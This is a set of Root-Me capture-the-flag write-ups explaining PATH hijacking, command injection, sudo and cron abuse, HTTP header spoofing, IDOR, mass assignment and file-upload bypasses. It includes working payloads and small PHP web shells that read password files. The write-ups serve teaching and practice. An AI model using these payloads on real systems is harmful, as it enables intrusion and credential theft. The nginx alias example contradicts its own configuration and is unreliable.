# Root-Me CTF Writeups - Detailed Solutions

## Table of Contents
- [App - Script Challenges](#app---script-challenges)
- [Web - Server Challenges](#web---server-challenges)

---

## App - Script Challenges

### Bash - System 1

**Difficulty:** Easy  
**Points:** 5  
**Category:** Privilege Escalation

#### Challenge Description
Exploit a SUID binary that uses the `ls` command without an absolute path.

#### Source Code Analysis
```c
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
    setreuid(geteuid(), geteuid());
    system("ls /challenge/app-script/ch11/.passwd");
    return 0;
}
```

**Vulnerability:** The `system()` call executes `ls` without specifying its absolute path (`/bin/ls`). This allows us to manipulate the `PATH` environment variable to execute our malicious version of `ls`.

#### Exploitation Steps

1. **Create a malicious `ls` command:**
```bash
echo '#!/bin/bash' > /tmp/ls
echo 'cat /challenge/app-script/ch11/.passwd' >> /tmp/ls
chmod +x /tmp/ls
```

2. **Modify the PATH to prioritize our malicious binary:**
```bash
export PATH=/tmp:$PATH
```

3. **Execute the vulnerable binary:**
```bash
./ch11
```

#### Result
The password is revealed because the binary now executes our fake `ls` command with elevated privileges.

#### Key Takeaways
- Always use absolute paths in privileged programs
- The `PATH` variable determines where the system searches for executables
- SUID binaries that call external commands are vulnerable to PATH hijacking

---

### Sudo - Weak Configuration

**Difficulty:** Easy  
**Points:** 5  
**Category:** Privilege Escalation

#### Challenge Description
An administrator configured sudo permissions with wildcards, creating a security vulnerability.

#### Reconnaissance
Check sudo permissions:
```bash
sudo -l
```

Output:
```
User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*
```

**Vulnerability:** The wildcard `*` in the path allows path traversal using `..`

#### Exploitation
```bash
sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
```

#### Key Takeaways
- Wildcards in sudo configurations can be exploited with path traversal
- Always specify exact file paths in sudoers configuration
- The `..` operator can bypass directory restrictions

---

### Bash - System 2

**Difficulty:** Easy  
**Points:** 10  
**Category:** Privilege Escalation

#### Source Code
```c
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    setreuid(geteuid(), geteuid());
    system("ls -lA /challenge/app-script/ch12/.passwd");
    return 0;
}
```

**Vulnerability:** Similar to Bash - System 1, but `/tmp` has restricted permissions.

#### Exploitation Steps

1. **Create a writable directory:**
```bash
mkdir /tmp/test
cd /tmp/test
```

2. **Create malicious `ls` binary:**
```bash
echo '#!/bin/bash' > ls
echo 'cat /challenge/app-script/ch12/.passwd' >> ls
chmod +x ls
```

3. **Modify PATH and execute:**
```bash
export PATH=/tmp/test:$PATH
./ch12
```

#### Key Takeaways
- Even with restricted `/tmp` permissions, user subdirectories can be created
- PATH manipulation remains effective with proper directory setup

---

### PowerShell - Command Injection

**Difficulty:** Medium  
**Points:** 15  
**Category:** Command Injection

#### Challenge Description
Exploit command injection in a PowerShell script that processes user input.

#### Initial Reconnaissance
```powershell
> ls
```
Shows database connection information and files.

#### Vulnerability Analysis
The script uses user input directly in commands without sanitization. Testing with semicolon (`;`) reveals command injection capability.

#### Exploitation
```powershell
> ; ls
```
Lists directory contents with hidden files including `.passwd`.

```powershell
> ; cat .passwd
```
Retrieves the password.

#### Key Takeaways
- The semicolon (`;`) terminates the current command and allows execution of a new one
- PowerShell input should always be sanitized and validated
- Never trust user input in shell commands

---

### LaTeX - Input

**Difficulty:** Medium  
**Points:** 20  
**Category:** File Inclusion

#### Challenge Description
Exploit a LaTeX compilation service to read sensitive files.

#### Source Code Analysis
The wrapper script compiles user-provided `.tex` files with security flags:
- `-no-shell-escape` prevents command execution
- But file inclusion is still possible!

#### Initial Attempt
```latex
\documentclass{article}
\begin{document}
\input{/challenge/app-script/ch23/.passwd}
\end{document}
```

**Problem:** The password might contain LaTeX special characters that get interpreted as commands.

#### Solution - Using verbatim
```latex
\documentclass{article}
\usepackage{verbatim}
\begin{document}
\verbatiminput{/challenge/app-script/ch23/.passwd}
\end{document}
```

Execute:
```bash
./setuid-wrapper /tmp/test2/test.tex
[+] Compilation ...
[+] Output file : /tmp/tmp.VfE41BV6JI/main.pdf
```

#### Key Takeaways
- LaTeX `\input` directive can read arbitrary files
- The `verbatim` package treats special characters as literal text
- Disable file inclusion in production LaTeX environments

---

### Bash - Unquoted Expression Injection

**Difficulty:** Medium  
**Points:** 25  
**Category:** Command Injection

#### Source Code
```bash
#!/bin/bash
PATH="/bin:/usr/bin"
PASS=$(cat .passwd)

if test -z "${1}"; then
    echo "USAGE : $0 [password]"
    exit 1
fi

if test $PASS -eq ${1} 2>/dev/null; then
    echo "Well done you can validate the challenge with : $PASS"
else
    echo "Try again ,-)"
fi
```

**Vulnerability:** Line 13 uses unquoted variables in `test` comparison. The `-eq` operator is for numeric comparison only.

#### Understanding the Vulnerability
When variables are unquoted, bash performs word splitting and allows injection of test operators.

#### Exploitation
```bash
./wrapper '0 -o foo'
```

**Explanation:**
- The test becomes: `test $PASS -eq 0 -o foo`
- `-o` means OR operation
- `foo` (non-empty string) evaluates to true
- The condition succeeds regardless of password

#### Key Takeaways
- Always quote variables in bash: `"$PASS"` and `"${1}"`
- Unquoted variables allow injection of operators
- Use proper comparison operators (`==` for strings, `-eq` for integers)

---

### Perl - Command Injection

**Difficulty:** Medium  
**Points:** 25  
**Category:** Command Injection

#### Source Code Analysis
The script uses Perl's `open()` function with 2 arguments:
```perl
if(!open(F, $file)) {
    die "[-] Can't open $file: $!\n";
}
```

**Vulnerability:** Perl's 2-argument `open()` interprets special characters:
- `|command` - Opens a pipe from command output
- `command|` - Opens a pipe to command input

#### Exploitation

**Method 1: Pipe output**
```
>>> cat .passwd |
```

**Method 2: Pipe input**
```
>>> | cat .passwd
```

Both methods execute `cat .passwd` with elevated privileges.

#### Key Takeaways
- Always use 3-argument `open()` in Perl: `open(F, '<', $file)`
- 2-argument `open()` treats filenames as potential commands
- Modern Perl code should avoid 2-argument `open()`

---

### Python - input()

**Difficulty:** Easy  
**Points:** 15  
**Category:** Code Injection

#### Source Code
```python
#!/usr/bin/python2
import sys

def youLose():
    print "Try again ;-)"
    sys.exit(1)

try:
    p = input("Please enter password : ")
except:
    youLose()

with open(".passwd") as f:
    passwd = f.readline().strip()
    try:
        if (p == int(passwd)):
            print "Well done ! You can validate with this password !"
    except:
        youLose()
```

**Vulnerability:** Python 2's `input()` evaluates the input as Python code (equivalent to `eval(raw_input())`).

#### Exploitation
```python
__import__('os').system('cat .passwd')
```

**Explanation:**
- `__import__('os')` imports the os module
- `.system()` executes the shell command
- The password is printed to stdout

#### Key Takeaways
- Python 2's `input()` is dangerous - use `raw_input()` instead
- Python 3's `input()` is safe (equivalent to Python 2's `raw_input()`)
- Never use `eval()` on user input

---

### Bash - cron

**Difficulty:** Medium  
**Points:** 25  
**Category:** Privilege Escalation

#### Challenge Description
Exploit a cron job that executes scripts from a world-writable directory.

#### Cron Configuration Analysis
```bash
lrwxrwxrwx 1 root root 11 Dec 10 2021 cron.d -> /tmp/._cron
```

The cron job:
1. Executes every minute
2. Runs files in `cron.d/` with root privileges
3. Files must be executable (`-x`) and regular files (`-f`)
4. 5-second timeout
5. Deletes the script after execution

#### Exploitation Strategy
Since stdout goes to `/dev/null`, we need to redirect output to a file.

```bash
#!/bin/bash
cat /challenge/app-script/ch4/.passwd > /challenge/app-script/ch4/password.txt
```

Make it executable:
```bash
chmod +x /challenge/app-script/ch4/cron.d/exploit.sh
```

Wait up to 60 seconds for cron execution, then:
```bash
cat /challenge/app-script/ch4/password.txt
```

#### Key Takeaways
- World-writable directories used by cron are severe vulnerabilities
- Always redirect output when stdout is unavailable
- Cron jobs should never execute code from user-writable locations

---

### AppArmor - Jail Introduction

**Difficulty:** Easy  
**Points:** 5  
**Category:** Sandbox Escape

#### Challenge Description
Introduction to AppArmor security restrictions.

*Note: This challenge appears to be listed but not detailed in the original writeup.*

---

## Web - Server Challenges

### HTML - Source Code

**Difficulty:** Easy  
**Points:** 5  
**Category:** Information Disclosure

#### Challenge Description
Find credentials hidden in HTML source code.

#### Solution
View page source (Ctrl+U or right-click → View Source):

```html
<!-- Je crois que c'est vraiment trop simple là ! -->
<!-- It's really too easy ! -->
<!-- password : nZ^&@q5&sjJHev0 -->
```

#### Key Takeaways
- Always check HTML source for sensitive information
- Comments should never contain passwords or secrets
- Use browser developer tools (F12) for thorough inspection

---

### Weak Password

**Difficulty:** Easy  
**Points:** 5  
**Category:** Authentication

#### Solution
Try default credentials:
- **Login:** admin
- **Password:** admin

#### Key Takeaways
- Always change default credentials
- Use strong, unique passwords
- Implement account lockout policies

---

### HTTP - User-agent

**Difficulty:** Easy  
**Points:** 10  
**Category:** HTTP Header Manipulation

#### Challenge Description
The server checks the User-Agent header for authentication.

#### Initial Response
```
Wrong user-agent: you are not the "admin" browser!
```

#### Exploitation
Intercept the request and modify the User-Agent header:

```http
GET / HTTP/1.1
Host: challenge01.root-me.org
User-Agent: admin
```

#### Key Takeaways
- User-Agent header can be easily modified
- Never rely on User-Agent for security decisions
- Use proper authentication mechanisms

---

### HTTP - Open Redirect

**Difficulty:** Medium  
**Points:** 20  
**Category:** Redirect Manipulation

#### Challenge Description
Redirect to an external domain not listed on the page.

#### Analysis
The redirect mechanism uses two parameters:
- `url`: The destination URL
- `h`: MD5 hash of the URL for validation

#### Exploitation Steps

1. **Choose target domain:** `https://google.com`

2. **Generate MD5 hash:**
```bash
echo -n "https://google.com" | md5sum
# Output: 99999ebcfdb78df077ad2727fd00969f
```

3. **Construct the request:**
```
http://challenge/redirect?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f
```

#### Key Takeaways
- URL validation using hashes can be bypassed if the hash function is known
- Implement a whitelist of allowed redirect domains
- Never trust client-side validation

---

### HTTP - IP Restriction Bypass

**Difficulty:** Medium  
**Points:** 20  
**Category:** Access Control

#### Challenge Description
Access restricted to internal IP addresses only.

#### Initial Response
```
Access denied - External IP detected
```

#### Analysis
The server uses the `X-Forwarded-For` header to determine client IP.

**X-Forwarded-For Header:**
Used by proxies to indicate the original client IP:
```
X-Forwarded-For: client-ip, proxy1-ip, proxy2-ip
```

#### Exploitation
Add the header with a private IP:

```http
GET / HTTP/1.1
Host: challenge01.root-me.org
X-Forwarded-For: 192.168.1.1
```

#### Key Takeaways
- X-Forwarded-For can be easily spoofed
- Never trust X-Forwarded-For for security decisions
- Use server-side IP validation from TCP connection

---

### PHP - Command Injection

**Difficulty:** Medium  
**Points:** 25  
**Category:** Command Injection

#### Challenge Description
Exploit command injection in a ping utility.

#### Vulnerability Analysis
The application pings user-supplied IP addresses:
```php
$response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
```

**Vulnerability:** No input sanitization on `$_POST["ip"]`.

#### Command Injection Operators
- `;` - Command separator
- `\n` (0x0a) - Newline
- `` ` `` - Command substitution
- `$()` - Command substitution

#### Exploitation Steps

1. **Test injection:**
```
;whoami
```

2. **List files:**
```
;ls
```

Output shows `index.php` and `.passwd`.

3. **Read source code:**
```
;cat index.php
```

4. **Retrieve password:**
```
;cat .passwd
```

#### Key Takeaways
- Always sanitize and validate user input
- Use parameterized commands or safe APIs
- Avoid shell_exec() with user input
- Implement input whitelisting (e.g., IP address validation)

---

### API - Broken Access (IDOR)

**Difficulty:** Medium  
**Points:** 30  
**Category:** API Security

#### Challenge Description
Test API security before frontend deployment.

#### API Exploration

**1. Create user:**
```bash
curl -X POST http://api/signup \
  -H "Content-Type: application/json" \
  -d '{"username":"me","password":"notme"}'
```

**2. Login:**
```bash
curl -X POST http://api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"me","password":"notme"}'
```

**3. Add note:**
```bash
curl -X PUT http://api/note \
  -H "Content-Type: application/json" \
  -d '{"note":"me or notme"}'
```

**4. Get user info:**
```bash
curl -X GET http://api/user
```

Response:
```json
{
  "note": "me or notme",
  "userid": 3,
  "username": "me"
}
```

#### IDOR Vulnerability
**IDOR (Insecure Direct Object Reference):** Access control flaw allowing unauthorized access to objects.

#### Exploitation
Try accessing other user IDs:

```bash
curl -X GET http://api/user/1
```

Response:
```json
{
  "note": "<flag>",
  "userid": 1,
  "username": "admin"
}
```

#### Key Takeaways
- Always implement proper authorization checks
- Verify user has permission to access requested resources
- Use UUIDs instead of sequential IDs
- Implement rate limiting on sensitive endpoints

---

### Backup File

**Difficulty:** Easy  
**Points:** 15  
**Category:** Information Disclosure

#### Challenge Description
Find and access backup files.

#### Methodology
Use Burp Suite Intruder with common backup file patterns:
- `index.php~`
- `index.php.bak`
- `index.php.backup`
- `index.php.old`
- `index.bak`
- etc.

#### Discovery
Found: `index.php.bak` (200 OK response)

#### Content
```php
<?php
$username = "ch11";
$password = "<password>";
// ... rest of the code
```

#### Key Takeaways
- Remove backup files from production servers
- Use `.htaccess` or web server config to block access to backup files
- Implement proper deployment processes that don't leave artifacts

---

### HTTP - Directory Indexing

**Difficulty:** Easy  
**Points:** 15  
**Category:** Information Disclosure

#### Challenge Description
Navigate through improperly configured directory listings.

#### Exploration Path

1. **Root directory:**
```
http://challenge/
```
Shows directory listing with `/admin/` folder.

2. **Admin directory:**
```
http://challenge/admin/
```
Contains subdirectories including `/backup/`.

3. **Backup directory:**
```
http://challenge/admin/backup/
```
Contains `admin.txt` file.

4. **Retrieve password:**
```
http://challenge/admin/backup/admin.txt
```

#### Key Takeaways
- Disable directory indexing in web server configuration
- Apache: `Options -Indexes`
- Nginx: `autoindex off;`
- Use proper access controls on sensitive directories

---

### HTTP - Headers

**Difficulty:** Easy  
**Points:** 10  
**Category:** HTTP Header Manipulation

#### Challenge Description
Gain administrator access by manipulating HTTP headers.

#### Analysis
Initial response includes:
```http
Header-RootMe-Admin: none
```

#### Exploitation
Add/modify the request header:

```http
GET / HTTP/1.1
Host: challenge01.root-me.org
Header-RootMe-Admin: true
```

Or:
```http
Header-RootMe-Admin: admin
```

#### Key Takeaways
- Custom headers are not secure authentication mechanisms
- Headers can be easily manipulated by clients
- Use proper session management and authentication

---

### HTTP - POST

**Difficulty:** Easy  
**Points:** 15  
**Category:** Parameter Tampering

#### Challenge Description
Beat the high score in a game.

#### Analysis
The client-side code limits the possible score (1 in a million chance).

#### Exploitation
Intercept the POST request and modify the score parameter:

```http
POST /score HTTP/1.1
Host: challenge01.root-me.org
Content-Type: application/x-www-form-urlencoded

score=999999999
```

#### Key Takeaways
- Never trust client-side validation
- Implement server-side validation for all inputs
- Validate ranges and business logic server-side

---

### HTTP - Improper Redirect

**Difficulty:** Medium  
**Points:** 25  
**Category:** Authentication Bypass

#### Challenge Description
Access `index.php` despite redirect to login page.

#### Vulnerability
PHP continues processing after `header('Location: ...')` unless `exit()` is called.

#### Exploitation
The server processes the request and generates the full response before redirecting. Intercept and view the response body before following the redirect.

Common vulnerable filenames to test:
- `admin.php`
- `dashboard.php`
- `index.php`
- `home.php`

#### Key Takeaways
- Always call `exit()` after `header()` redirects in PHP
- Redirects are client-side - server still processes the request
- Implement proper session validation on every page

---

### HTTP - Verb Tampering

**Difficulty:** Medium  
**Points:** 25  
**Category:** HTTP Method Manipulation

#### Challenge Description
Bypass security by using non-standard HTTP methods.

#### HTTP Methods Overview
- **Standard:** GET, POST, PUT, DELETE, HEAD, OPTIONS
- **Less common:** PATCH, CONNECT, TRACE

#### Testing Methodology
Test all HTTP methods against the endpoint:

```bash
for method in GET POST PUT DELETE HEAD OPTIONS PATCH CONNECT TRACE; do
    echo "Testing $method:"
    curl -X $method http://challenge/
done
```

#### Discovery
The `CONNECT` method returns the password.

#### Key Takeaways
- Restrict allowed HTTP methods in web server configuration
- Implement proper access controls for all HTTP methods
- Use method-specific security checks

---

### Install Files

**Difficulty:** Easy  
**Points:** 15  
**Category:** Information Disclosure

#### Challenge Description
Find leftover installation files.

#### Common Installation Files
- `install.php`
- `install/`
- `setup.php`
- `config.php`
- `install.sql`

#### Exploitation
```
http://challenge/install.php
```

Reveals database credentials or other sensitive configuration.

#### Key Takeaways
- Remove installation scripts after deployment
- Use proper deployment procedures
- Restrict access to setup/config files

---

### Nginx - Alias Misconfiguration

**Difficulty:** Medium  
**Points:** 30  
**Category:** Path Traversal

#### Challenge Description
Exploit misconfigured Nginx alias directive.

#### Nginx Configuration
```nginx
location /assets/ {
    alias /var/www/assets/;
}
```

#### Vulnerability
When alias doesn't end with `/` or location mismatch, path traversal is possible.

#### Exploitation
```
GET /assets../ HTTP/1.1
```

This resolves to `/var/www/` instead of `/var/www/assets/`.

```
GET /assets../flag.txt HTTP/1.1
```

#### Key Takeaways
- Ensure alias paths end with `/` when location ends with `/`
- Use `root` directive instead of `alias` when possible
- Test for path traversal in Nginx configurations

---

### Nginx - Root Location Misconfiguration

**Difficulty:** Medium  
**Points:** 30  
**Category:** Information Disclosure

#### Challenge Configuration
```nginx
server {
    root /etc/nginx;
    
    location = / {
        return 302 /login/login.html;
    }
    
    location /login/ {
        alias /usr/share/nginx/html/login/;
    }
    
    location / {
        try_files $uri $uri/ =404;
    }
}
```

**Vulnerability:** Root is set to `/etc/nginx/`, allowing access to server configuration.

#### Exploitation

1. **Access nginx.conf:**
```
GET /nginx.conf HTTP/1.1
```

2. **Access conf.d directory:**
```
GET /conf.d/ HTTP/1.1
```

3. **Read configuration files:**
```
GET /conf.d/default.conf HTTP/1.1
```

#### Key Takeaways
- Never set root to sensitive directories like `/etc/`
- Use specific locations for each resource
- Regularly audit Nginx configurations

---

### CRLF Injection

**Difficulty:** Medium  
**Points:** 35  
**Category:** Log Injection

#### Challenge Description
Inject false authentication data into logs.

#### CRLF Characters
- **CR (Carriage Return):** `\r` or `%0D`
- **LF (Line Feed):** `\n` or `%0A`

#### Vulnerability
Logs don't sanitize input, allowing newline injection.

#### Exploitation
```http
GET /?user=attacker%0D%0Aadmin authenticated successfully HTTP/1.1
```

The log will show:
```
[timestamp] user=attacker
admin authenticated successfully
```

#### Key Takeaways
- Always sanitize input before logging
- Escape or remove CRLF characters
- Use structured logging (JSON) instead of plain text

---

### File Upload - Double Extensions

**Difficulty:** Medium  
**Points:** 30  
**Category:** File Upload Bypass

#### Challenge Description
Upload PHP code to a gallery that only accepts images.

#### Vulnerability
Server checks file extension but executes based on Apache configuration.

#### Exploitation

1. **Create PHP shell:**
```php
<?php
$content = shell_exec('cat ../../../.passwd');
echo "<pre>$content</pre>";
?>
```

2. **Save as:** `shell.php.png`

3. **Upload the file**

4. **Access:** `http://challenge/uploads/shell.php.png`

**Why it works:** Apache processes the file based on the first recognized extension (`.php`), not the last one.

#### Key Takeaways
- Validate file content, not just extension
- Use content-type checking
- Store uploads outside web root
- Disable script execution in upload directories

---

### File Upload - MIME Type

**Difficulty:** Medium  
**Points:** 30  
**Category:** File Upload Bypass

#### Challenge Description
Bypass MIME type validation.

#### Vulnerability
Server validates Content-Type header instead of actual file content.

#### Exploitation

1. **Create PHP shell:**
```php
<?php
$content = shell_exec('cat ../../../.passwd');
echo "<pre>$content</pre>";
?>
```

2. **Intercept upload request**

3. **Modify Content-Type:**
```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php ... ?>
------WebKitFormBoundary--
```

#### Key Takeaways
- Never trust client-supplied MIME types
- Validate file content using magic bytes
- Use libraries like `fileinfo` in PHP for proper validation
- Disable execution in upload directories

---

### HTTP - Cookies

**Difficulty:** Easy  
**Points:** 10  
**Category:** Cookie Manipulation

#### Challenge Description
Manipulate cookies to gain admin access.

#### Hint
"Bob really loves cookies!"

#### Analysis
Application uses cookies for authentication:
```http
Set-Cookie: ch7=guest
```

#### Exploitation
Modify the cookie value:

```http
GET / HTTP/1.1
Host: challenge01.root-me.org
Cookie: ch7=admin
```

Or via browser console:
```javascript
document.cookie = "ch7=admin";
```

#### Key Takeaways
- Never store sensitive data in cookies without encryption
- Use cryptographically signed cookies (HMAC)
- Implement proper session management server-side
- Validate cookie values on every request

---

### Insecure Code Management

**Difficulty:** Medium  
**Points:** 30  
**Category:** Information Disclosure

#### Challenge Description
Retrieve admin password from exposed version control.

#### Discovery
Test for exposed `.git` directory:
```
http://challenge/.git/
```

Returns 200 OK instead of 404.

#### Exploitation

1. **Download repository:**
```bash
wget -r http://challenge/.git/
```

2. **Open with Git client (GitKraken)**
   - Create account
   - Open repository
   - Browse commit history

3. **Find sensitive commit:**
Look for commits with messages like:
- "Remove hardcoded password"
- "Fix security issue"
- "Temporary credentials"

4. **View changes in `config.php`:**
```php
<?php
$username = "admin";
$password = "<password>";
```

#### Key Takeaways
- Never commit sensitive data to version control
- Add `.git/` to web server deny rules
- Use `.gitignore` for sensitive files
- Rotate credentials if accidentally committed

---

### API - Mass Assignment

**Difficulty:** Medium  
**Points:** 35  
**Category:** API Security

#### Challenge Description
Exploit mass assignment to gain admin privileges.

#### Initial Reconnaissance

**Create user:**
```bash
curl -X POST http://api/signup \
  -H "Content-Type: application/json" \
  -d '{"username":"newuser","password":"123"}'
```

**Get user info:**
```bash
curl -X GET http://api/user
```

Response:
```json
{
  "note": "",
  "status": "guest",
  "userid": 7,
  "username": "newuser"
}
```

Notice the `status` field set to `guest`.

#### Mass Assignment Vulnerability
The API doesn't restrict which fields can be modified via PUT/PATCH requests.

#### Exploitation

**Attempt to modify status:**
```bash
curl -X PUT http://api/user \
  -H "Content-Type: application/json" \
  -d '{"status":"admin"}'
```

Response:
```json
{
  "note": "",
  "status": "admin",
  "userid": 7,
  "username": "newuser"
}
```

#### Key Takeaways
- Explicitly define which fields users can modify
- Use separate DTOs for input and output
- Implement attribute whitelisting
- Never trust all fields from user input
- Use frameworks with built-in protection (e.g., Strong Parameters in Rails)

---

## Additional Resources

### Learning Paths

1. **Beginners:**
   - Start with HTML/Weak Password challenges
   - Progress to HTTP header manipulation
   - Learn basic command injection

2. **Intermediate:**
   - Study IDOR and mass assignment
   - Practice file upload bypasses
   - Learn server misconfiguration exploitation

3. **Advanced:**
   - Combine multiple techniques
   - Research zero-day vulnerabilities
   - Contribute to bug bounty programs

### Recommended Tools

- **Burp Suite Community:** HTTP interception and manipulation
- **OWASP ZAP:** Free alternative to Burp
- **curl:** Command-line HTTP client
- **Postman:** API testing and development
- **GitKraken:** Git repository visualization

### Further Reading

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

**Last Updated:** January 2026  
**Total Challenges:** 28  
**Difficulty Range:** Easy to Medium

